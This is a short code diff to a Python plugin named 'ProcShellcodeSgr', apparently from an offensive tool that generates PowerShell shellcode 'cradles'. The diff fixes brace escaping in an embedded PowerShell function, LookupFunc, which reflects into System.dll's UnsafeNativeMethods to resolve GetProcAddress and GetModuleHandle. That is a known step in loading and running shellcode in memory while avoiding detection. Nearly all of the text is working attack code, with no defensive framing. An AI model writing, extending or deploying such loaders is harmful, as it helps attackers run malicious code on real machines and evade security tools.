@@ -31,12 +31,12 @@ class ProcShellcodeSgr(BaseCradlePlugin):
         payload = []
         payload.append(
             f"({sgr(f"""
-function LookupFunc {{}
+function LookupFunc {{
     Param($moduleName, $functionName)
 
-    $assem = ([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods');
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}}).GetType('Microsoft.Win32.UnsafeNativeMethods');
     $tmp=@();
-    $assem.GetMethods()|ForEach-Object{if($_.Name -eq "GetProcAddress"){$tmp+=$_}};
+    $assem.GetMethods()|ForEach-Object{{if($_.Name -eq "GetProcAddress"){{$tmp+=$_}}}};
     return $tmp[0].Invoke($null,@(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)),$functionName))
 }}
 
